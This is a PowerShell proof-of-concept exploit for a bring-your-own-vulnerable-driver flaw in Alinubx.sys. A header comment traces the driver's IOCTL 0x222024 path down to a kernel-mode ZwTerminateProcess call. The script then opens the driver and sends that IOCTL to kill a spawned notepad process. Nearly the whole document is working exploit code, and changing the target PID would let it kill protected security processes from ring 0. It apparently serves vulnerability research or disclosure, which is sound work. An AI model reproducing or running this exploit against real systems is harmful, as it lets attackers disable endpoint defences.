<#
.SYNOPSIS
    Execution Flow Summary: Alinubx.sys Arbitrary Process Termination via BYOVD
        
.DESCRIPTION
    1. User-Mode: App sends DeviceIoControl with IOCTL 0x222024 and an 8-byte buffer ([PID: DWORD, ExitStatus: DWORD]).
    2. Central Dispatch (sub_36C74): I/O Manager routes IRP_MJ_DEVICE_CONTROL (0x0E) requests to the master handler.
    3. Master Parser (sub_36464): Validates buffer size, extracts the target PID and exit status, and invokes sub_229BC.
    4. Core Terminator (sub_229BC): Resolves the target PID via PsLookupProcessByProcessId, creates a privileged 
        handle via ObOpenObjectByPointer, and forces process termination using ZwTerminateProcess from Ring 0.
#>

Clear-Host
Write-Host "[*] Starting Alinubx.sys IOCTL client proof-of-concept..." -ForegroundColor Cyan

try {
    $Handle = Get-FileHandle -FileName "Alinubx" 

    $TargetProc = Start-Process notepad -PassThru 
    $TargetPID  = $TargetProc.Id
    $ExitCode   = 0x0 # Desired NTSTATUS exit code

    Write-Host "[+] Target Process spawned with PID: $TargetPID" -ForegroundColor Green

    # Create the 8-byte in/out buffer structure: [DWORD PID] [DWORD ExitStatus]
    # Length must be 8 bytes total (4 bytes for PID, 4 bytes for Exit Status)
    $inOutPtr = New-IntPtr -Size 8 -TypeSize ([Int32], [Int32]) -Values ($TargetPID, $ExitCode)

    Write-Host "[*] Sending IOCTL 0x222024 to terminate PID $TargetPID..." -ForegroundColor Yellow
    Invoke-IoctlCall -Mode 0 -FileHandle $Handle -IoCtrlCode 0x222024 -InOutPtr $inOutPtr -InputSize 8 -OutputSize 0

    Write-Host "[+] IOCTL executed successfully. Process should be terminated." -ForegroundColor Green
}
catch {
    Write-Error "[-] Error occurred during IOCTL execution: $_"
}
finally {
    Free-IntPtr $inOutPtr -Method Auto
    Free-IntPtr $Handle -Method NtHandle
}